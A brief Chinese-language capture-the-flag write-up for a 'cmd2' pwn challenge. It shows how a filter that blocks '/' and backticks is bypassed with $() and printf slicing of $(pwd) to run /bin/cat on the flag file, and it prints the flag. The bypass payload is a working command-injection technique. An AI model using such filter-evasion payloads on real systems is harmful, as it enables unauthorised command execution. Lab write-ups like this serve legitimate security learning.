## Pwn
具體解法和前一題差不多，只是這次 `filter()` 會擋 `/`, `backtick`

目標指令：
```
./cmd2 '/bin/cat f""lag'
```

但 `/` 不能輸入，所以我們要找其他方法產生 `/` 這個字元。

有趣的是 `filter()` 雖然擋了 backtick，但沒有擋 `$()`。

使用 shell built-in command "printf" 可以從 $(pwd) 切除一個 `/`

```
cmd2@prowl:~$ ./cmd2 'echo $(printf %.1s $(pwd))'
echo $(printf %.1s $(pwd))
/
```

想辦法用這樣的 command substitution + printf string formatting 拼湊出目標指令即可
```
cmd2@prowl:~$ ./cmd2 '$(printf "%.1sbin%.1scat" $(pwd) $(pwd)) f""lag'
$(printf "%.1sbin%.1scat" $(pwd) $(pwd)) f""lag
FuN_w1th_5h3ll_v4riabl3s_haha
```
